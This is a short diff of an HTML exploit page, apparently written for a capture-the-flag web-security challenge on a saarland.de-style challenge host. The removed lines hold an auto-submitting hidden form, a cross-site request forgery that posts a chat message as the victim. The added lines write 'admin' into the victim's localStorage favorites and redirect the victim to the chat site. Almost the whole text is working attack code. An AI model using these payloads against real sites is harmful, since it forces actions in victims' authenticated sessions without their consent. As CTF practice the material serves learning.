@@ -2,16 +2,11 @@
 <body>
 
 <script>
-// خلي الضحية يختار admin
+// step 1: force admin
 localStorage.setItem("favorites", '["admin"]');
-</script>
 
-<form id="f" action="https://chat.owley-madison.jeopardy.websec.saarland/send" method="POST">
-    <input type="hidden" name="message" value="hi admin">
-</form>
-
-<script>
-document.getElementById("f").submit();
+// step 2: افتح الشات
+window.location = "https://chat.owley-madison.jeopardy.websec.saarland/";
 </script>
 
 </body>
